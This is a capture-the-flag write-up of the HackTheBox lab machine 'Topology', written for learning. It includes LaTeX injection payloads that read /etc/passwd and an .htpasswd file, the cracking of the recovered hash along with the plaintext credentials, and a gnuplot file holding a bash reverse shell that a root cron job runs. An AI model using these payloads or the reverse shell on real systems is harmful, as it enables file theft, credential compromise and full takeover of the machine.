---
title: HackTheBox | Topology
description: Writeup of an easy-rated Linux machine from HackTheBox
date: 2023-11-3 03:00:00 -500
categories: [Machines, HackTheBox, Easy]
tags: [Web Exploitation, Burpsuite, vhost, LaTeX Injection, LFI, .htpasswd, gnuplot, pspy64, Plot File Injection]
pin: true
math: true
mermaid: true
image:
  path: /assets/img/htb-topology/topology.png
---

***

<center><strong><font color="DarkGray"><a href="https://app.hackthebox.com/machines/Topology" target="_blank"><er>Topology</er></a> is a vulnerable machine on HackTheBox. It features an HTTP server with three virtual hosts, including a LaTeX Equation Generator susceptible to LFI vulnerabilities via LaTeX injection. Further exploitation leads to the extraction of credentials that can be used to gain access on the server. Once inside, there is a script that runs every minute with root privileges, executing every plot file within a specific directory. To escalate privileges and obtain a root shell on the box, all it takes is writing a malicious plot file, inside this directory, that provides a reverse shell when executed.</font></strong></center>

***

# **<strong><font color="Brown">Recon</font></strong>**

***
## **<strong><font color="DarkCyan">Port Scanning</font></strong>**
### **<strong><font color="DarkKhaki">Initial Scan</font></strong>**

Initial nmap scan:
```bash
$ nmap -sC -sV -T4 -oN nmap/nmap.initial 10.10.11.217
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-08 17:30 EDT
Nmap scan report for 10.10.11.217
Host is up (0.13s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 dc:bc:32:86:e8:e8:45:78:10:bc:2b:5d:bf:0f:55:c6 (RSA)
|   256 d9:f3:39:69:2c:6c:27:f1:a9:2d:50:6c:a7:9f:1c:33 (ECDSA)
|_  256 4c:a6:50:75:d0:93:4f:9c:4a:1b:89:0a:7a:27:08:d7 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Miskatonic University | Topology Group
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.86 seconds
```
Nmap found **2** open ports:
* Port `22` running an SSH service `OpenSSH 8.2p1` on an **Ubuntu** server
* Port `80` running an HTTP service running `Apache httpd 2.4.41`

### **<strong><font color="DarkKhaki">All ports</font></strong>**

```bash
$ nmap -p- -T4 10.10.11.217
PORT    STATE    SERVICE      REASON
22/tcp  open     ssh          syn-ack ttl 63
80/tcp  open     http         syn-ack ttl 63
```
* Same ports discovered during the initial scan

## **<strong><font color="DarkCyan">Service Enumeration</font></strong>**
### **<strong><font color="MediumPurple">SSH - 22</font></strong>**

I’ll temporarily suspend the enumeration of this service, just in case I don’t discover any valuable information that could help establish an initial foothold on the other service.

### **<strong><font color="DarkCyan">HTTP - 80</font></strong>**
#### **<strong><font color="DarkKhaki">Front Page</font></strong>**

* Navigating to *`http://10.10.11.217/`*, we see the home page of the '*Topology Group*':

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-topology/2023-10-08 22_35_23-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>http://10.10.11.217</i></center>
<br/>

* The '*Staff*' section contains the names of the people who are running the **Topology Group**.

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-topology/2023-10-14 03_06_46-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>Staff</i></center>
<br/>

* **Professor Lilian Klein** is the head of *Topology Group*
* **Vajramani Dailsley** is a software developer
* **Derek Abrahams** is the sysadmin

* We also see the email address and phone number of Professor '`Lilian Klein`'
    * email: `lkelein@topology.htb`
    * Tel. : +1-202-555-0143

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-topology/2023-10-14 03_07_03-KaliLinux - VMware Workstation 17 Player (Non-commercial use only) 1.png" alt="">
<center><i>Contact Information</i></center>
<br/>

* With that in mind, let's add the domain name `topology.htb` into the `/etc/hosts` file as shown below:

```bash
$ echo '10.10.11.217  topology.htb' >> /etc/hosts
```

* In the '*Software projects*' section, clicking on '**LaTeX Equation Generator**' redirects to the website *`http://latex.topology.htb/equation.php`* website.

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-topology/2023-10-14 03_12_23-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>LaTeX Equation Generator Project</i></center>
<br/>

#### **<strong><font color="DarkKhaki">Virtual Hosts Fuzzing:</font></strong>**
First of all, before starting the enumeration of `latex.topology.htb` virtual host, let's fuzz for other potential virtual hosts using `ffuf`: <br/>

```bash
ffuf -u http://topology.htb -H 'Host: FUZZ.topology.htb' -fs 6767 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://topology.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.topology.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 6767
________________________________________________

[Status: 200, Size: 108, Words: 5, Lines: 6, Duration: 803ms]
    * FUZZ: stats

[Status: 401, Size: 463, Words: 42, Lines: 15, Duration: 4293ms]
    * FUZZ: dev
```

* By filtering out responses with a size of **6767**, I was able to identify 2 interesting virtual hosts, as can be seen in the output above.

In order to interact with these hosts, we need to add them into our `/etc/hosts` file: <br/>

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-topology/2023-10-14 03_34_15-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>/etc/hosts</i></center>
<br/>

#### **<strong><font color="DarkKhaki">stats.topology.htb:</font></strong>**

When accessing this virtual host, we see a plot, as shown in the screenshot below, showcasing the server load per minute. <br/>

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-topology/2023-10-14 03_36_42-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>http://stats.topology.htb</i></center>
<br/>


##### **<strong><font color="DarkKhaki">dev.topology.htb:</font></strong>**

This particular virtual host is secured by a basic authentication mechanism. We need valid credentials in order to access it.<br/>

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-topology/2023-10-14 03_38_32-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>http://dev.topology.htb</i></center>
<br/>


#### **<strong><font color="DarkKhaki">latex.topology.htb:</font></strong>**
##### **<strong><font color="Orange">Directory Listing enabled:</font></strong>**

* Directory Listing is enabled at *`http://latex.topology.htb`*:

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-topology/2023-10-14 03_16_43-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>http://latex.topology.htb</i></center>
<br/>

* The files in this directory doesn't contain interesting information. With that said, let's proceed to enumerate the `/equation.php` endpoint.

##### **<strong><font color="Orange">/equation.php:</font></strong>**

Navigating to *`http://latex.topology.htb/equation.php`*, we are presented with a LaTeX generator, which converts user-supplied mathematical equations into an image (`.png` file). <br/>

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-topology/2023-10-14 03_20_54-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>http://latex.topology.htb/equation.php</i></center>
<br/>

For example, submitting `x + y = 2`, and clicking on the '**Generate**' button, will return `.png` image, as show in the screenshots below: <br/>

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-topology/2023-10-14 03_23_39-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>submitting x+y=2</i></center>
<br/>

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-topology/2023-10-14 03_23_22-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>png image</i></center>
<br/>

Keeping that in mind, there could be security issues in this conversion feature if the provided LaTeX code is not properly sanitized !!

# **<strong><font color="Brown">Exploitation</font></strong>**

***
## **<strong><font color="DarkCyan">LFI via LaTex Injection</font></strong>**
#### **<strong><font color="DarkKhaki">Reading first lines:</font></strong>**

After some testing and a lot of googling, I successfully retrieved the first line of the `/etc/passwd` file on the server using the one-liner payload from [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection), shown below: <br/>

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-topology/2023-10-14 04_51_52-PayloadsAllTheThings_LaTeX Injection at master · swisskyrepo_PayloadsAllTheThing.png" alt="">
<center><i>Read Single lined file Payload</i></center>
<br/>

```latex
\newread\file\openin\file=/etc/passwd\read\file to\line\text{\line}\closein\file
```

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-topology/2023-10-14 04_43_01-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>First line of /etc/passwd</i></center>
<br/>

Following this attempt, I duplicated the payload to read multiple lines. However, I was only successful in reading the first **4** lines of the file. Trying to read more than **4** lines triggers the message '`Input too long. Sorry`' as there is an input limitation in the backend to prevent long inputs. <br/>

* Reading the first 4 lines of the `/etc/passwd` file:
```latex
\newread\file\openin\file=/etc/passwd\read\file to\line\text{\line}\read\file to\line\text{\line}\read\file to\line\text{\line}\read\file to\line\text{\line}\closein\file
```

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-topology/2023-10-14 05_03_33-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>First 4 lines of /etc/passwd</i></center>
<br/>

* Reading the first 5 lines of the `/etc/passwd` file:
```latex
\newread\file\openin\file=/etc/passwd\read\file to\line\text{\line}\read\file to\line\text{\line}\read\file to\line\text{\line}\read\file to\line\text{\line}\read\file to\line\text{\line}\closein\file
```

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-topology/2023-10-14 05_05_58-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>Input too long</i></center>
<br/>

#### **<strong><font color="DarkKhaki">Reading the entire file:</font></strong>**

After numerous unsuccessful attempts to exploit this LFI vulnerability using commands that would typically allow me to read entire files, I noticed this line in [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection).<br/> 
It suggested that I could enclose the commands I previously used with either `\[` or `$` to potentially retrieve the entire file's content. <br/>

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-topology/2023-10-14 16_52_21-PayloadsAllTheThings_LaTeX Injection at master · swisskyrepo_PayloadsAllTheThing.png" alt="">
<center><i>Injection Wrappers</i></center>
<br/>

* The command that eventually worked and allowed me to read the entire content of the `/etc/passwd` file is displayed below: <br/>

```latex
$\lstinputlisting{/etc/passwd}$
```

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-topology/2023-10-14 16_49_21-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>/etc/passwd file</i></center>
<br/>


#### **<strong><font color="DarkKhaki">Reading the source code:</font></strong>**

The next typical step, when it comes to the exploitation of `LFI` vulnerabilities, is to retrieve the content of the source code of the page, which is in this case 'equation.php' file. This is to check for any comments within the code that might contain sensitive information and to gain a better understanding of the conversion functionality. <br/>

```latex
$\lstinputlisting{../equation.php}$
```

* The first lines of the script include the name of the developer of this LaTeX to PNG generator:<br/>

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-topology/2023-10-14 17_38_41-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>Comments</i></center>
<br/>


* The section below defines the filtering mechanism designed to mitigate LaTeX injection vulnerabilities.<br/>

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-topology/2023-10-14 17_38_58-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>Filtering Mechanism against LaTeX injection</i></center>
<br/>

* As shown in the screenshot above, many of the strings that can potentially exploit a LaTeX injection vulnerability are filtered and stored within the `$filterstrings` array:
	* `\begin`, `\immediate`, `\usepackage`, `\input`, `\write`, `\loop`, `\include`, `\@`, `\while`, `\def`, `\url`, `\href`, `\end`.

> **NOTE**: *Notice that the command `\lsinputlisting` does not figure in this array, which is why we were able to read files on the server.*

#### **<strong><font color="DarkKhaki">Reading files in dev.topology.htb vhost:</font></strong>**

After some testing, I attempted to read the `/etc/passwd` file using path traversal and observed that the root `/` could be accessed by going three directories back (`../../../`) from where the `equation.php` file is located. This implies that the `equation.php` file is likely in the directory `/var/www/latex/equation.php` since it's accessible from the '**latex**' virtual host.

Once I determined the absolute path, I tried to read files located within the '**dev**' virtual host. But before doing that, I decided to use `ffuf` to scan for potentially interesting files that we could access:
```bash
ffuf -u http://dev.topology.htb/FUZZ -fs 463 -w /usr/share/wordlists/dirb/common.txt
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/                                                       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/                                                      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       
       v2.0.0-dev    
________________________________________________
 :: Method           : GET
 :: URL              : http://dev.topology.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 463
________________________________________________

[Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 132ms]
    * FUZZ: .hta

[Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 136ms]
    * FUZZ: .htaccess

[Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 151ms]
    * FUZZ: .htpasswd

[Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 173ms]
    * FUZZ: ~bin

[Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 169ms]
    * FUZZ: ~lp

[Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 138ms]
    * FUZZ: ~mail

[Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 139ms]
    * FUZZ: ~nobody

[Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 114ms]
    * FUZZ: ~sys

[Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 1697ms]
    * FUZZ: javascript

[Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 1140ms]
    * FUZZ: server-status

:: Progress: [4615/4615] :: Job [1/1] :: 25 req/sec :: Duration: [0:03:05] :: Errors: 45 ::
```

* The `.htpasswd` file is of particular interest. This file is typically used to store usernames and their corresponding hashed passwords for authentication. If we can access this file, we might be able to crack the hashed password and gain access to the **dev** virtual host.

Using the payload below, we can retrive the content of this file from the **dev** virtual host directory `/var/www/dev/`<br/>

```latex
$\lstinputlisting{/var/www/dev/.htpasswd}$
```

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-topology/2023-10-14 17_55_03-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>/var/www/dev/.htpasswd</i></center>
<br/>

I'll save the password hash in a file named '`hash.txt`' and use the hash cracking tool, '`john`', to attempt to crack it, utilizing the '`rockyou.txt`' wordlist.

```bash
$ echo -n '$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0' > hash.txt
$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-topology/2023-10-14 18_17_05-KaliLinux - VMware Workstation 17 Player (Non-commercial use only) 1.png" alt="">
<center><i>JohnTheRipper</i></center>
<br/>

* As shown above, the password hash has been successfully cracked and the credentials to access the **dev** vhost are:
	* Username: `vdaisley`
	* Password: `calculus20`

# **<strong><font color="Brown">Initial Access</font></strong>**

***
## **<strong><font color="DarkCyan">Shell as vdaisley</font></strong>**
### **<strong><font color="DarkKhaki">Access to dev.topology.htb</font></strong>**

After entering the credentials, I successfully accessed to the `dev.topology.htb` virtual host, which represents the portfolio of the software developper `Vajramani Dailsley` <br/>

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-topology/2023-10-14 18_21_09-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>http://dev.topology.htb/</i></center>
<br/>

* The front page and its source code do not contain any particularly interesting information.

### **<strong><font color="DarkKhaki">SSH Access as vdaisley</font></strong>**

Using the same credentials for the '**dev**' virtual host, I successfully gained SSH access to the box as `vdaisley`: <br/>

```bash
$ ssh vdaisley@topology.htb
vdaisley@topology.htb's password: calculus20
```

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-topology/2023-10-14 18_37_17-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>SSH Access as vdaisley</i></center>
<br/>


# **<strong><font color="Brown">Privilege Escalation</font></strong>**

***
## **<strong><font color="DarkCyan">Shell as root</font></strong>**
### **<strong><font color="DarkKhaki">Enumeration</font></strong>**

**1-** The user flag is located in the HOME directory of the compromised user `vdaisley`: <br/>

```bash
vdaisley@topology:~$ ls -l user.txt 
-rw-r----- 1 root vdaisley 33 Oct 14 13:36 user.txt
```

**2-** There are only 2 users on the box with console access: <br/>

```bash
vdaisley@topology:~$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
vdaisley:x:1007:1007:Vajramani Daisley,W2 1-123,,:/home/vdaisley:/bin/bash
```

**3-** The user `vdaisley` may not run `sudo` on the box: <br/>

```bash
vdaisley@topology:~$ sudo -l
[sudo] password for vdaisley: 
Sorry, user vdaisley may not run sudo on topology.
```

**4-** There are no interesting binaries with SUID bit: <br/>

```bash
vdaisley@topology:~$ find / -type f -perm -04000 2>/dev/null
/usr/sbin/pppd
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/sudo
/usr/bin/fusermount
/usr/bin/umount
/usr/bin/su
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/at
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/passwd
/usr/bin/chfn
```

**5-** Enumerating file capabilities: <br/>

```bash
vdaisley@topology:~$ getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
```
* Nothing interesting !!

**6-** The `/opt/` directory contains a folder named `gnuplot`, which is writable & not readable by the user `vdaisley`: <br/>

```bash
vdaisley@topology:/opt$ ls -la
total 12
drwxr-xr-x  3 root root 4096 May 19 13:04 .
drwxr-xr-x 18 root root 4096 Jun 12 10:37 ..
drwx-wx-wx  2 root root 4096 Jun 14 07:45 gnuplot

vdaisley@topology:/opt$ ls gnuplot
ls: cannot open directory 'gnuplot': Permission denied
```

**7-** Configured Cron Jobs: <br/>

```bash
vdaisley@topology:~$ crontab -l
no crontab for vdaisley
vdaisley@topology:~$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```
* No Cron job is configured !!

### **<strong><font color="DarkKhaki">Inspecting running processes with pspy:</font></strong>**

To enumerate running processes, let's transfer the **pspy64** binary into the target machine. To do so, let's follow the steps below: <br/>

**1.** Download [pspy64](https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64) from the latest release on your local machine: <br/>

```bash
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
```

**2.** Start a simple HTTP server using python, which will be serving the **pspy64** binary: <br/>

```bash
python3 -m http.server 80
```

**3.** Download the **pspy64** binary in the **/tmp/** directory of target machine: <br/>

```bash
vdaisley@topology:~$ cd /tmp/
vdaisley@topology:/tmp/$ wget http://tun0-IP/pspy64
```

**4.** Make the binary **pspy64** executable and run it: <br/>

```bash
vdaisley@topology:/tmp/$ chmod +x pspy64
vdaisley@topology:/tmp/$ ./pspy64
```

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-topology/2023-10-14 18_56_27-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i></i></center>
<br/>
<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-topology/2023-10-14 18_57_16-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>pspy64</i></center>
<br/>

* As can be seen, the script `getdata.sh`, located inside the `/opt/gnuplot` directory, is executed every minute with root privileges.

### **<strong><font color="DarkKhaki">Analyzing getdata.sh actions from pspy64:</font></strong>**

From the output captured by **pspy64**, we can observe that when the `getdata.sh` script is executed, it runs several commands like `cut`, `tr` and `grep` with root privileges. However the interesting command is the `find` command, which is shown below

```bash
find /opt/gnuplot -name *.plt -exec gnuplot {} 
```

* This command searches for plot files with a `.plt` extension in the directory `/opt/gnuplot`. It then executes the `gnuplot` binary with root privileges on all the retrieved plot files from the `/opt/gnuplot` directory.

Considering that we already have write privileges for this directory, we can create a malicious plot file with a `.plt` extension within it, that would provide us with a reverse shell running as root when executed using `gnuplot`.

### **<strong><font color="DarkKhaki">/opt/gnuplot:</font></strong>**

* As mentioned in the section above, the user `vdaisley` cannot read/view the content of the `/opt/gnuplot` directory. However, he has privileges to write inside the directory:

```bash
vdaisley@topology:/tmp$ find /opt -type d -writable 2>/dev/null
/opt/gnuplot
```

With that in mind, let's proceed with the privilege escalation process by following the steps below:

**1.** Create a plot file inside `/opt/gnuplot` that contains a bash reverse shell script: <br/>

```plot
!/usr/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.2/9999 0>&1'
```
> *Note the exclamation mark at the beginning of the script*

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-topology/2023-10-14 19_22_43-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>revshell.plt</i></center>
<br/>

> **NOTE** : *Don't forget to modify the IP address with your tun0 IP*

**2.** Start a netcat listener on port **9999**: <br/>

```bash
$ nc -nlvp 9999
```

**3.** After a minute or so, you should get a reverse shell back running as **root**: <br/>

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/htb-topology/2023-10-14 19_24_20-KaliLinux - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>root shell</i></center>
<br/>

# <strong><font color="Brown">Attack Chain</font></strong>

***

1. Nmap discovered **2** open ports:
	* Port **22** running **OpenSSH 8.2p1**
	* Port **80** running **Apache 2.4.41**
2. The HTTP service is running **3** virtual hosts:
	* The virtual host `latex.topology.htb` is running a **LaTeX Equation Generator**, which is vulnerable to LFI vulnerability via LaTeX injection, allowing an attacker to read sensitive files on the server.
	* The virtual host `dev.topology.htb` cannot be accessed unless you provide valid credentials. These credentials can be retrieved by exploiting the LFI vulnerability in `latex.topology.htb` to read the content of `.htpasswd` file, which contains the username and the password hash.
	* The virtual host `stats.topology.htb` displays the server load in a plot graph.
3. After cracking the password hash inside `/var/www/dev/.htpasswd`, I was able to gain access to the server via SSH using the same credentials that were used to access the `dev.topology.htb` virtual host.
4. Once in, there is a script that runs every minute with root privileges, executing every plot file with a `.plt` extension within the `/opt/gnuplot` directory. To escalate privileges and obtain a root shell on the box, all it takes is writing a malicious plot file that provides a reverse shell when executed.

# <strong><font color="Brown">LaTeX Injection Resources</font></strong>

***

> *<a href="https://salmonsec.com/cheatsheets/exploitation/latex_injection" target="_blank"><er>https://salmonsec.com/cheatsheets/exploitation/latex_injection</er></a>*

> *<a href="https://tex.stackexchange.com/questions/262625/security-latex-injection-hack" target="_blank"><er>https://tex.stackexchange.com/questions/262625/security-latex-injection-hack</er></a>*

> *<a href="https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/" target="_blank"><er>http://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/</er></a>*

> *<a href="https://infosecwriteups.com/latex-to-rce-private-bug-bounty-program-6a0b5b33d26a" target="_blank"><er>https://infosecwriteups.com/latex-to-rce-private-bug-bounty-program-6a0b5b33d26a</er></a>*

> *<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection" target="_blank"><er>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection</er></a>*

> *<a href="https://0day.work/hacking-with-latex/" target="_blank"><er>https://0day.work/hacking-with-latex/</er></a>*

> *<a href="https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection#write-file" target="_blank"><er>https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection#write-file</er></a>*



